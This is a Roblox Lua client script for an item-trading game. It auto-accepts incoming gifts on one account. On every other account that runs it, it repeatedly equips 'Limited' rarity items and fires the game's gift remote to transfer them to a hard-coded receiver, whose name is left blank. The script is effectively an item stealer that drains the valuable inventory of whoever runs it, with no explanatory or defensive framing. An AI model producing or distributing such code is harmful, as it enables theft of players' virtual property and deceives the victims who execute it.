local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local Backpack = LocalPlayer:WaitForChild("Backpack")

local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local giftItemRemote = Remotes:WaitForChild("GiftItem")
local acceptGiftRemote = Remotes:WaitForChild("AcceptGift")

local targetReceiverName = ""

local function getToolRarity(tool)
    if not tool:IsA("Tool") then return nil end
    local model = tool:FindFirstChildOfClass("Model")
    if model then
        return model:GetAttribute("Rarity")
    end
    return nil
end

giftItemRemote.OnClientEvent:Connect(function(giftPayload)
    if giftPayload and type(giftPayload) == "table" and giftPayload.ID then
        acceptGiftRemote:FireServer({
            ID = giftPayload.ID
        })
    end
end)

if LocalPlayer.Name ~= targetReceiverName then
    Character.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then
            local rarity = getToolRarity(child)
            local brainrotValue = child:GetAttribute("Brainrot")
            if rarity == "Limited" and brainrotValue ~= "Pacchetto Di Carte" then
                task.spawn(function()
                    while child.Parent == Character do
                        local targetPlayer = Players:FindFirstChild(targetReceiverName)
                        if targetPlayer and targetPlayer.Character then
                            giftItemRemote:FireServer({
                                ToGift = targetPlayer.Name,
                                Item = child
                            })
                            task.wait(4)
                        else
                            task.wait(0.5)
                        end
                    end
                end)
            end
        end
    end)

    task.spawn(function()
        while task.wait(1) do
            if Humanoid and Humanoid.Health > 0 and not Character:FindFirstChildOfClass("Tool") then
                local plantTools = {}
                for _, tool in ipairs(Backpack:GetChildren()) do
                    if tool:IsA("Tool") and tool:GetAttribute("Brainrot") then
                        local rarity = getToolRarity(tool)
                        local brainrotValue = tool:GetAttribute("Brainrot")
                        if rarity == "Limited" and brainrotValue ~= "Tung Tung Tung Sahur" then
                            table.insert(plantTools, tool)
                        end
                    end
                end

                if #plantTools > 0 then
                    local randomToolToEquip = plantTools[math.random(#plantTools)]
                    Humanoid:EquipTool(randomToolToEquip)
                end
            end
        end
    end)
end
